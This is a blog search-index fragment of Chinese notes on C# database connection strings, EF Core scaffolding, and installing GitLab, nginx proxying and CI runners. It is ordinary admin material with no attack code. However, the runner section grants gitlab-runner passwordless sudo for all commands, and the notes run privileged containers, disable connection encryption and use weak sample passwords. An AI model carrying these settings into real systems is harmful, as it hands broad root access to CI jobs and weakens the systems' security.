Source=your_server_ip;Database=your_database_name;User ID=your_username;Min Pool Size=10;Password=your_password;Connect Timeout=30;Encrypt=False;TrustServerCertificate=False;ApplicationIntent=ReadWrite;MultiSubnetFailover=False\" } } 代码使用 services.AddDbContextPool( options =\u003e{ options.UseSqlServer(Configuration.GetConnectionString(\"BloggingDatabase\")); } ,poolSize:64 ); ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/:2:1","series":null,"tags":["blog","csharp"],"title":"csharp代码配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/#mysql"},{"categories":["blog"],"content":" 数据库连接字符串 Mysql Server=ip或域名;Database=数据库;Uid=root;Pwd=密码;MinimumPoolSize=10;maximumpoolsize=50; SqlServersql server 连接配置 { \"ConnectionStrings\": { \"BloggingDatabase\": \"Data Source=your_server_ip;Database=your_database_name;User ID=your_username;Min Pool Size=10;Password=your_password;Connect Timeout=30;Encrypt=False;TrustServerCertificate=False;ApplicationIntent=ReadWrite;MultiSubnetFailover=False\" } } 代码使用 services.AddDbContextPool( options =\u003e{ options.UseSqlServer(Configuration.GetConnectionString(\"BloggingDatabase\")); } ,poolSize:64 ); ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/:2:1","series":null,"tags":["blog","csharp"],"title":"csharp代码配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/#sqlserver"},{"categories":["blog"],"content":" 命令","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/:3:0","series":null,"tags":["blog","csharp"],"title":"csharp代码配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/#命令"},{"categories":["blog"],"content":" 生成 user-jwts dotnet user-jwts create --role admin --role superadmin --audience ken(一般是url地址) --claim is_allow=true(自定义claim) ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/:3:1","series":null,"tags":["blog","csharp"],"title":"csharp代码配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/#生成-user-jwts"},{"categories":["blog"],"content":" 生成 model EFCore # Sqlite dotnet ef dbcontext scaffold \"Data Source=test. Db\" -o Models Microsoft. EntityFrameworkCore. Sqlite -c \"TestDbContext\" -f # Mysql dotnet ef dbcontext scaffold \"server=localhost; port=3306; user=root; password=mypass; database=sakila\" MySql. Data. EntityFrameworkCore -o sakila -f # 或者 Scaffold-DbContext \"server=localhost; port=3306; user=root; password=mypass; database=sakila\" MySql. Data. EntityFrameworkCore -OutputDir Models -f # Oracle Scaffold-DbContext \"Data Source=(DESCRIPTION =(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(HOST = 192.168.0.220)(PORT = 1521)))(CONNECT_DATA =(SERVICE_NAME = orcl))); User ID=kentxxq; Password=mypass;\" Oracle. EntityFrameworkCore -OutputDir Models Freesql FreeSql.Generator -Razor 1 -NameOptions 0,0,0,0 -NameSpace WebApplication1 -DB \"MySql,data source=ip或地址;port=3306;user id=用户名;password=密码;initial catalog=库名;charset=utf8;sslmode=none;max pool size=2\" ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/:3:2","series":null,"tags":["blog","csharp"],"title":"csharp代码配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/#生成-model"},{"categories":["blog"],"content":" 生成 model EFCore # Sqlite dotnet ef dbcontext scaffold \"Data Source=test. Db\" -o Models Microsoft. EntityFrameworkCore. Sqlite -c \"TestDbContext\" -f # Mysql dotnet ef dbcontext scaffold \"server=localhost; port=3306; user=root; password=mypass; database=sakila\" MySql. Data. EntityFrameworkCore -o sakila -f # 或者 Scaffold-DbContext \"server=localhost; port=3306; user=root; password=mypass; database=sakila\" MySql. Data. EntityFrameworkCore -OutputDir Models -f # Oracle Scaffold-DbContext \"Data Source=(DESCRIPTION =(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(HOST = 192.168.0.220)(PORT = 1521)))(CONNECT_DATA =(SERVICE_NAME = orcl))); User ID=kentxxq; Password=mypass;\" Oracle. EntityFrameworkCore -OutputDir Models Freesql FreeSql.Generator -Razor 1 -NameOptions 0,0,0,0 -NameSpace WebApplication1 -DB \"MySql,data source=ip或地址;port=3306;user id=用户名;password=密码;initial catalog=库名;charset=utf8;sslmode=none;max pool size=2\" ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/:3:2","series":null,"tags":["blog","csharp"],"title":"csharp代码配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/#efcore"},{"categories":["blog"],"content":" 生成 model EFCore # Sqlite dotnet ef dbcontext scaffold \"Data Source=test. Db\" -o Models Microsoft. EntityFrameworkCore. Sqlite -c \"TestDbContext\" -f # Mysql dotnet ef dbcontext scaffold \"server=localhost; port=3306; user=root; password=mypass; database=sakila\" MySql. Data. EntityFrameworkCore -o sakila -f # 或者 Scaffold-DbContext \"server=localhost; port=3306; user=root; password=mypass; database=sakila\" MySql. Data. EntityFrameworkCore -OutputDir Models -f # Oracle Scaffold-DbContext \"Data Source=(DESCRIPTION =(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(HOST = 192.168.0.220)(PORT = 1521)))(CONNECT_DATA =(SERVICE_NAME = orcl))); User ID=kentxxq; Password=mypass;\" Oracle. EntityFrameworkCore -OutputDir Models Freesql FreeSql.Generator -Razor 1 -NameOptions 0,0,0,0 -NameSpace WebApplication1 -DB \"MySql,data source=ip或地址;port=3306;user id=用户名;password=密码;initial catalog=库名;charset=utf8;sslmode=none;max pool size=2\" ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/csharp%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/:3:2","series":null,"tags":["blog","csharp"],"title":"csharp代码配置","uri":"/posts/%E7%AC%94%E8%AE%B0/csharp%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/#freesql"},{"categories":["point"],"content":"gitlab 是一个开源免费的 git 服务端. 要点: 开源, 免费 用户量很大 功能全面 ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/gitlab/:0:0","series":null,"tags":["point","gitlab"],"title":"gitlab","uri":"/posts/%E7%AC%94%E8%AE%B0/point/gitlab/#"},{"categories":["blog"],"content":"这里记录 [[笔记/point/gitlab|gitlab]] 的安装, 配置.","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/","series":null,"tags":["blog","gitlab"],"title":"gitlab教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/"},{"categories":["blog"],"content":" 简介这里记录 gitlab 的安装, 配置. ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/:1:0","series":null,"tags":["blog","gitlab"],"title":"gitlab教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/#简介"},{"categories":["blog"],"content":" 内容","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/:2:0","series":null,"tags":["blog","gitlab"],"title":"gitlab教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/#内容"},{"categories":["blog"],"content":" 安装 环境准备 # 拉取镜像 docker pull gitlab/gitlab-ce:16.7.3-ce.0 # 跑起来 docker run \\ --privileged=true \\ --hostname git.kentxxq.com \\ --detach \\ --publish 80:80 \\ --publish 443:443 \\ --publish 222:22 \\ --name gitlab \\ --restart unless-stopped \\ --volume /root/gitlab/config:/etc/gitlab \\ --volume /root/gitlab/logs:/var/log/gitlab \\ --volume /root/gitlab/data:/var/opt/gitlab \\ gitlab/gitlab-ce:16.7.3-ce.0 # 停止，修改端口和url docker stop gitlab 修改端口和 url 主机配置文件路径 /root/gitlab/config/gitlab.rb 容器内 /etc/gitlab/gitlab.rb # 配置域名地址 external_url 'https://git.kentxxq.com' # ssh地址 gitlab_rails['gitlab_ssh_host'] = 'git.kentxxq.com' # ssh端口 gitlab_rails['gitlab_shell_ssh_port'] = 10022 # nginx的地址,允许它代理gitlab gitlab_rails['trusted_proxies'] = ['nginx的ip地址'] # 禁用自带的 nginx nginx['enable'] = false # 服务监听方式 gitlab_workhorse['listen_network'] = \"tcp\" gitlab_workhorse['listen_addr'] = \"0.0.0.0:80\" 如果不生效, 可以在容器内使用环境变量（遇到过配置文件不生效的 bug，用来临时解决问题）。 export external_url=\"https://git.kentxxq.com\" gitlab-ctl reconfigure gitlab-ctl restart 重新启动 docker start gitlab 配置 nginx 转发stream 放置在 nginx.conf 的最外层配置，用于 ssh 方式拉取代码 stream { upstream gitlab { hash $remote_addr consistent; server 172.16.0.52:222; } server { listen 10022; proxy_connect_timeout 30s; proxy_timeout 300s; proxy_pass gitlab; } } 配置域名代理 server { listen 80; server_name git.kentxxq.com; return 301 https://$server_name$request_uri; access_log /usr/local/nginx/conf/hosts/logs/git.kentxxq.com.log k-json; } server { http2 on; listen 443 ssl; server_name git.kentxxq.com; access_log /usr/local/nginx/conf/hosts/logs/git.kentxxq.com.log k-json; # 普通header头,ip之类的 include /usr/local/nginx/conf/options/normal.conf; # 证书相关 include /usr/local/nginx/conf/options/ssl_chinnshi.conf; location / { proxy_pass http://172.16.0.52:80; } } ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/:2:1","series":null,"tags":["blog","gitlab"],"title":"gitlab教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/#安装"},{"categories":["blog"],"content":" 安装 环境准备 # 拉取镜像 docker pull gitlab/gitlab-ce:16.7.3-ce.0 # 跑起来 docker run \\ --privileged=true \\ --hostname git.kentxxq.com \\ --detach \\ --publish 80:80 \\ --publish 443:443 \\ --publish 222:22 \\ --name gitlab \\ --restart unless-stopped \\ --volume /root/gitlab/config:/etc/gitlab \\ --volume /root/gitlab/logs:/var/log/gitlab \\ --volume /root/gitlab/data:/var/opt/gitlab \\ gitlab/gitlab-ce:16.7.3-ce.0 # 停止，修改端口和url docker stop gitlab 修改端口和 url 主机配置文件路径 /root/gitlab/config/gitlab.rb 容器内 /etc/gitlab/gitlab.rb # 配置域名地址 external_url 'https://git.kentxxq.com' # ssh地址 gitlab_rails['gitlab_ssh_host'] = 'git.kentxxq.com' # ssh端口 gitlab_rails['gitlab_shell_ssh_port'] = 10022 # nginx的地址,允许它代理gitlab gitlab_rails['trusted_proxies'] = ['nginx的ip地址'] # 禁用自带的 nginx nginx['enable'] = false # 服务监听方式 gitlab_workhorse['listen_network'] = \"tcp\" gitlab_workhorse['listen_addr'] = \"0.0.0.0:80\" 如果不生效, 可以在容器内使用环境变量（遇到过配置文件不生效的 bug，用来临时解决问题）。 export external_url=\"https://git.kentxxq.com\" gitlab-ctl reconfigure gitlab-ctl restart 重新启动 docker start gitlab 配置 nginx 转发stream 放置在 nginx.conf 的最外层配置，用于 ssh 方式拉取代码 stream { upstream gitlab { hash $remote_addr consistent; server 172.16.0.52:222; } server { listen 10022; proxy_connect_timeout 30s; proxy_timeout 300s; proxy_pass gitlab; } } 配置域名代理 server { listen 80; server_name git.kentxxq.com; return 301 https://$server_name$request_uri; access_log /usr/local/nginx/conf/hosts/logs/git.kentxxq.com.log k-json; } server { http2 on; listen 443 ssl; server_name git.kentxxq.com; access_log /usr/local/nginx/conf/hosts/logs/git.kentxxq.com.log k-json; # 普通header头,ip之类的 include /usr/local/nginx/conf/options/normal.conf; # 证书相关 include /usr/local/nginx/conf/options/ssl_chinnshi.conf; location / { proxy_pass http://172.16.0.52:80; } } ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/:2:1","series":null,"tags":["blog","gitlab"],"title":"gitlab教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/#环境准备"},{"categories":["blog"],"content":" 安装 环境准备 # 拉取镜像 docker pull gitlab/gitlab-ce:16.7.3-ce.0 # 跑起来 docker run \\ --privileged=true \\ --hostname git.kentxxq.com \\ --detach \\ --publish 80:80 \\ --publish 443:443 \\ --publish 222:22 \\ --name gitlab \\ --restart unless-stopped \\ --volume /root/gitlab/config:/etc/gitlab \\ --volume /root/gitlab/logs:/var/log/gitlab \\ --volume /root/gitlab/data:/var/opt/gitlab \\ gitlab/gitlab-ce:16.7.3-ce.0 # 停止，修改端口和url docker stop gitlab 修改端口和 url 主机配置文件路径 /root/gitlab/config/gitlab.rb 容器内 /etc/gitlab/gitlab.rb # 配置域名地址 external_url 'https://git.kentxxq.com' # ssh地址 gitlab_rails['gitlab_ssh_host'] = 'git.kentxxq.com' # ssh端口 gitlab_rails['gitlab_shell_ssh_port'] = 10022 # nginx的地址,允许它代理gitlab gitlab_rails['trusted_proxies'] = ['nginx的ip地址'] # 禁用自带的 nginx nginx['enable'] = false # 服务监听方式 gitlab_workhorse['listen_network'] = \"tcp\" gitlab_workhorse['listen_addr'] = \"0.0.0.0:80\" 如果不生效, 可以在容器内使用环境变量（遇到过配置文件不生效的 bug，用来临时解决问题）。 export external_url=\"https://git.kentxxq.com\" gitlab-ctl reconfigure gitlab-ctl restart 重新启动 docker start gitlab 配置 nginx 转发stream 放置在 nginx.conf 的最外层配置，用于 ssh 方式拉取代码 stream { upstream gitlab { hash $remote_addr consistent; server 172.16.0.52:222; } server { listen 10022; proxy_connect_timeout 30s; proxy_timeout 300s; proxy_pass gitlab; } } 配置域名代理 server { listen 80; server_name git.kentxxq.com; return 301 https://$server_name$request_uri; access_log /usr/local/nginx/conf/hosts/logs/git.kentxxq.com.log k-json; } server { http2 on; listen 443 ssl; server_name git.kentxxq.com; access_log /usr/local/nginx/conf/hosts/logs/git.kentxxq.com.log k-json; # 普通header头,ip之类的 include /usr/local/nginx/conf/options/normal.conf; # 证书相关 include /usr/local/nginx/conf/options/ssl_chinnshi.conf; location / { proxy_pass http://172.16.0.52:80; } } ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/:2:1","series":null,"tags":["blog","gitlab"],"title":"gitlab教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/#修改端口和-url"},{"categories":["blog"],"content":" 安装 环境准备 # 拉取镜像 docker pull gitlab/gitlab-ce:16.7.3-ce.0 # 跑起来 docker run \\ --privileged=true \\ --hostname git.kentxxq.com \\ --detach \\ --publish 80:80 \\ --publish 443:443 \\ --publish 222:22 \\ --name gitlab \\ --restart unless-stopped \\ --volume /root/gitlab/config:/etc/gitlab \\ --volume /root/gitlab/logs:/var/log/gitlab \\ --volume /root/gitlab/data:/var/opt/gitlab \\ gitlab/gitlab-ce:16.7.3-ce.0 # 停止，修改端口和url docker stop gitlab 修改端口和 url 主机配置文件路径 /root/gitlab/config/gitlab.rb 容器内 /etc/gitlab/gitlab.rb # 配置域名地址 external_url 'https://git.kentxxq.com' # ssh地址 gitlab_rails['gitlab_ssh_host'] = 'git.kentxxq.com' # ssh端口 gitlab_rails['gitlab_shell_ssh_port'] = 10022 # nginx的地址,允许它代理gitlab gitlab_rails['trusted_proxies'] = ['nginx的ip地址'] # 禁用自带的 nginx nginx['enable'] = false # 服务监听方式 gitlab_workhorse['listen_network'] = \"tcp\" gitlab_workhorse['listen_addr'] = \"0.0.0.0:80\" 如果不生效, 可以在容器内使用环境变量（遇到过配置文件不生效的 bug，用来临时解决问题）。 export external_url=\"https://git.kentxxq.com\" gitlab-ctl reconfigure gitlab-ctl restart 重新启动 docker start gitlab 配置 nginx 转发stream 放置在 nginx.conf 的最外层配置，用于 ssh 方式拉取代码 stream { upstream gitlab { hash $remote_addr consistent; server 172.16.0.52:222; } server { listen 10022; proxy_connect_timeout 30s; proxy_timeout 300s; proxy_pass gitlab; } } 配置域名代理 server { listen 80; server_name git.kentxxq.com; return 301 https://$server_name$request_uri; access_log /usr/local/nginx/conf/hosts/logs/git.kentxxq.com.log k-json; } server { http2 on; listen 443 ssl; server_name git.kentxxq.com; access_log /usr/local/nginx/conf/hosts/logs/git.kentxxq.com.log k-json; # 普通header头,ip之类的 include /usr/local/nginx/conf/options/normal.conf; # 证书相关 include /usr/local/nginx/conf/options/ssl_chinnshi.conf; location / { proxy_pass http://172.16.0.52:80; } } ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/:2:1","series":null,"tags":["blog","gitlab"],"title":"gitlab教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/#配置-nginx-转发"},{"categories":["blog"],"content":" 常用配置 全局变量数gitlab 的全局变量数有上限. gitlab-rails console # 等待出现控制台 Plan.default.actual_limits.update!(ci_instance_level_variables: 100) 配置生效 gitlab-ctl reconfigure gitlab-ctl restart ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","gitlab"],"title":"gitlab教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/#常用配置"},{"categories":["blog"],"content":" 常用配置 全局变量数gitlab 的全局变量数有上限. gitlab-rails console # 等待出现控制台 Plan.default.actual_limits.update!(ci_instance_level_variables: 100) 配置生效 gitlab-ctl reconfigure gitlab-ctl restart ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","gitlab"],"title":"gitlab教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/#全局变量数"},{"categories":["blog"],"content":" 常用配置 全局变量数gitlab 的全局变量数有上限. gitlab-rails console # 等待出现控制台 Plan.default.actual_limits.update!(ci_instance_level_variables: 100) 配置生效 gitlab-ctl reconfigure gitlab-ctl restart ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","gitlab"],"title":"gitlab教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/#配置生效"},{"categories":["blog"],"content":" 升级 升级路径 DockerHub上搜索版本 # 停止现有容器 docker stop gitlab # 清理 docker system prune # 启动容器 docker run \\ --privileged=true \\ --hostname git.kentxxq.com \\ --detach \\ --publish 80:80 \\ --publish 443:443 \\ --publish 222:22 \\ --name gitlab \\ --restart unless-stopped \\ --volume /root/gitlab/config:/etc/gitlab \\ --volume /root/gitlab/logs:/var/log/gitlab \\ --volume /root/gitlab/data:/var/opt/gitlab \\ gitlab/gitlab-ce:15.11.2-ce.0 # 登录后台查看没有任务执行,即可重复升级步骤 ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["blog","gitlab"],"title":"gitlab教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/#升级"},{"categories":["blog"],"content":" 备份恢复官网备份手册 # 创建备份 docker exec -it gitlab gitlab-backup create # 拷贝 gitlab.rb,secrets.json,1686724904_2023_06_14_14.8.4_gitlab_backup.tar # 停止两个服务 gitlab-ctl stop puma gitlab-ctl stop sidekiq # 开始恢复,忽略掉_gitlab_backup.tar docker exec -it gitlab gitlab-backup restore BACKUP=1686724904_2023_06_14_14.8.4 # 重启容器 docker restart gitlab ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/:2:4","series":null,"tags":["blog","gitlab"],"title":"gitlab教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/#备份恢复"},{"categories":["blog"],"content":" CICD这里只是 CICD 的安装调试，具体使用看 gitlab-cicd教程. Shell-runner前期准备 多机器共享一个 nas, 缓存加速 放置 Maven 或 nodejs 等仓库配置文件 ossutil64 帮助拉取 OSS 上的隐私文件 wget -q http://gosspublic.alicdn.com/ossutil/1.7.9/ossutil64 /opt/ossutil64 安装 docker,并配置 docker镜像源 安装 helm curl https://baltocdn.com/helm/signing.asc | sudo apt-key add - sudo apt-get install apt-transport-https --yes echo \"deb https://baltocdn.com/helm/stable/debian/ all main\" | sudo tee /etc/apt/sources.list.d/helm-stable-debian.list sudo apt-get update sudo apt-get install helm # 验证效果 helm version 安装 kubectl curl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\" sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl kubectl version --client 开始安装 curl -LJO \"https://gitlab-runner-downloads.s3.amazonaws.com/latest/deb/gitlab-\"runner_amd64.deb dpkg -i gitlab-runner_amd64.deb usermod -aG docker gitlab-runner 配置 runner root@cicd:~# gitlab-runner register Runtime platform arch=amd64 os=linux pid=18805 revision=8925d9a0 version=14.1.0 Running in system-mode. Enter the GitLab instance URL (for example, https://gitlab.com/): https://git.kentxxq.com/ Enter the registration token: token秘钥 Enter a description for the runner:[cicd]: docker-ci Enter tags for the runner (comma-separated):docker-ciRegistering runner... succeeded runner=3uS9CxxN Enter an executor: parallels, shell, ssh, virtualbox, docker+machine, kubernetes, custom, docker-ssh, docker-ssh+machine, docker:shell Runner registered successfully. Feel free to start it, but if it's running already the config should be automatically reloaded! 修改配置 /etc/gitlab-runner/config.toml, 然后重启 gitlab-runner restart concurrent = 20 check_interval = 0 [session_server] session_timeout = 1800 [[runners]] name = \"runner01\" url = \"https://git.kentxxq.com/\" token = \"token秘钥\" executor = \"shell\" #pre_clone_script = \"sudo chown -R gitlab-runner:gitlab-runner .\" #pre_clone_script = \"sudo chmod -R 777 .\" [runners.custom_build_dir] enabled = true [runners.cache] [runners.cache.s3] [runners.cache.gcs] [runners.cache.azure] 免密 sudo # vim /etc/sudoers加入 gitlab-runner ALL=(ALL) NOPASSWD: ALL docker-runner # 注册 docker run --rm -it -v /srv/gitlab-runner/config:/etc/gitlab-runner gitlab/gitlab-runner register # 启动 docker run -d --name gitlab-runner --restart always \\ -v /root/gitlab-runner/config:/etc/gitlab-runner \\ -v /var/run/docker.sock:/var/run/docker.sock \\ gitlab/gitlab-runner:latest 缓存配置配置 runner 文件 ~/gitlab-runner/config/config.toml 的 runners.cache 部分。 minio 的安装看 minio教程. concurrent = 5 check_interval = 0 shutdown_timeout = 0 [session_server] session_timeout = 1800 [[runners]] name = \"shared\" url = \"https://gitlab.kentxxq.com/\" id = 1 token = \"1\" token_obtained_at = 2024-01-16T07:29:28Z token_expires_at = 0001-01-01T00:00:00Z executor = \"docker\" [runners.cache] # MaxUploadedArchiveSize = 0 Type = \"s3\" Path = \"cicd\" Shared = true [runners.cache.s3] ServerAddress = \"minio-cicd.kentxxq.com\" AccessKey = \"1\" SecretKey = \"2\" BucketName = \"runner\" Insecure = false ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/:2:5","series":null,"tags":["blog","gitlab"],"title":"gitlab教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/#cicd"},{"categories":["blog"],"content":" CICD这里只是 CICD 的安装调试，具体使用看 gitlab-cicd教程. Shell-runner前期准备 多机器共享一个 nas, 缓存加速 放置 Maven 或 nodejs 等仓库配置文件 ossutil64 帮助拉取 OSS 上的隐私文件 wget -q http://gosspublic.alicdn.com/ossutil/1.7.9/ossutil64 /opt/ossutil64 安装 docker,并配置 docker镜像源 安装 helm curl https://baltocdn.com/helm/signing.asc | sudo apt-key add - sudo apt-get install apt-transport-https --yes echo \"deb https://baltocdn.com/helm/stable/debian/ all main\" | sudo tee /etc/apt/sources.list.d/helm-stable-debian.list sudo apt-get update sudo apt-get install helm # 验证效果 helm version 安装 kubectl curl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\" sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl kubectl version --client 开始安装 curl -LJO \"https://gitlab-runner-downloads.s3.amazonaws.com/latest/deb/gitlab-\"runner_amd64.deb dpkg -i gitlab-runner_amd64.deb usermod -aG docker gitlab-runner 配置 runner root@cicd:~# gitlab-runner register Runtime platform arch=amd64 os=linux pid=18805 revision=8925d9a0 version=14.1.0 Running in system-mode. Enter the GitLab instance URL (for example, https://gitlab.com/): https://git.kentxxq.com/ Enter the registration token: token秘钥 Enter a description for the runner:[cicd]: docker-ci Enter tags for the runner (comma-separated):docker-ciRegistering runner... succeeded runner=3uS9CxxN Enter an executor: parallels, shell, ssh, virtualbox, docker+machine, kubernetes, custom, docker-ssh, docker-ssh+machine, docker:shell Runner registered successfully. Feel free to start it, but if it's running already the config should be automatically reloaded! 修改配置 /etc/gitlab-runner/config.toml, 然后重启 gitlab-runner restart concurrent = 20 check_interval = 0 [session_server] session_timeout = 1800 [[runners]] name = \"runner01\" url = \"https://git.kentxxq.com/\" token = \"token秘钥\" executor = \"shell\" #pre_clone_script = \"sudo chown -R gitlab-runner:gitlab-runner .\" #pre_clone_script = \"sudo chmod -R 777 .\" [runners.custom_build_dir] enabled = true [runners.cache] [runners.cache.s3] [runners.cache.gcs] [runners.cache.azure] 免密 sudo # vim /etc/sudoers加入 gitlab-runner ALL=(ALL) NOPASSWD: ALL docker-runner # 注册 docker run --rm -it -v /srv/gitlab-runner/config:/etc/gitlab-runner gitlab/gitlab-runner register # 启动 docker run -d --name gitlab-runner --restart always \\ -v /root/gitlab-runner/config:/etc/gitlab-runner \\ -v /var/run/docker.sock:/var/run/docker.sock \\ gitlab/gitlab-runner:latest 缓存配置配置 runner 文件 ~/gitlab-runner/config/config.toml 的 runners.cache 部分。 minio 的安装看 minio教程. concurrent = 5 check_interval = 0 shutdown_timeout = 0 [session_server] session_timeout = 1800 [[runners]] name = \"shared\" url = \"https://gitlab.kentxxq.com/\" id = 1 token = \"1\" token_obtained_at = 2024-01-16T07:29:28Z token_expires_at = 0001-01-01T00:00:00Z executor = \"docker\" [runners.cache] # MaxUploadedArchiveSize = 0 Type = \"s3\" Path = \"cicd\" Shared = true [runners.cache.s3] ServerAddress = \"minio-cicd.kentxxq.com\" AccessKey = \"1\" SecretKey = \"2\" BucketName = \"runner\" Insecure = false ","date":"2023-08-15","objectID":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/:2:5","series":null,"tags":["blog","gitlab"],"title":"gitlab教程","uri":"/posts/%E7%AC%94%E8%AE%B0/gitlab%E6%95%99%E7%A8%8B/#shell-runner"},{"categories":["blog"],"content":" CICD这里只是 CICD 的安装调试，具体使用看 gitlab-cicd教程. Shell-runner前期准备 多机器共享一个 nas, 缓存加速 放置 Maven 或 nodejs 等仓库配置文件 ossutil64 帮助拉取 OSS 上的隐私文件 wget -q http://gosspublic.alicdn.com/ossutil/1.7.9/ossutil64 /opt/ossutil64 安装 docker,并配置 docker镜像源 安装 helm curl https://baltocdn.com/helm/signing.asc | sudo apt-key add - sudo apt-get install apt-transport-https --yes echo \"deb https://baltocdn.com/helm/stable/debian/ all main\" | sudo tee /etc/apt/sources.list.d/helm-stable-debian.list sudo apt-get update sudo apt-get install helm # 验证效果 helm version 安装 kubectl curl -LO \"https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl\" sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl kubectl version --client 开始安装 curl -LJO \"https://gitlab-runner-downloads.s3.amazonaws.com/latest/deb/gitlab-\"runner_amd64.deb dpkg -i gitlab-runner_amd64.deb usermod -aG docker gitlab-runner 配置 runner root@cicd:~# gitlab-runner register Runtime platform arch=amd64 os=linux pid=18805 revision=8925d9a0 version=14.1.0 Running in system-mode. Enter the GitLab instance URL (for example, https://gitlab.com/): https://git.kentxxq.com/ Enter the registration token: token秘钥 Enter a description for the runner:[cicd]: docker-ci Enter tags for the runner (comma-separated):docker-ciRegistering runner... succeeded runner=3uS9CxxN Enter an executor: parallels, shell, ssh, virtualbox, docker+machine, kubernetes, custom, docker-ssh, docker-ssh+machine, docker:shell Runner registered successfully. Feel free to start it, but if it's running already the config should be automatically reloaded! 修改配置 /etc/gitlab-runner/config.toml, 然后重启 gitlab-runner restart concurrent = 20 check_interval = 0 [session_server] session_timeout = 1800 [[runners]] name = \"runner01\" url = \"https://git.kentxxq.com/\" token = \"token秘钥\" executor = \"shell\" #pre_clone_script = \"sudo chown -R gitlab-runner:gitlab-runner .\" #pre_clone_script = \"sudo chmod -R 777 .\" [runners.custom_build_dir] enabled = true [runners.cache] [runners.cache.s3] [runners.cache.gcs] [runners.cache.azure] 免密 sudo # vim /etc/sudoers加入 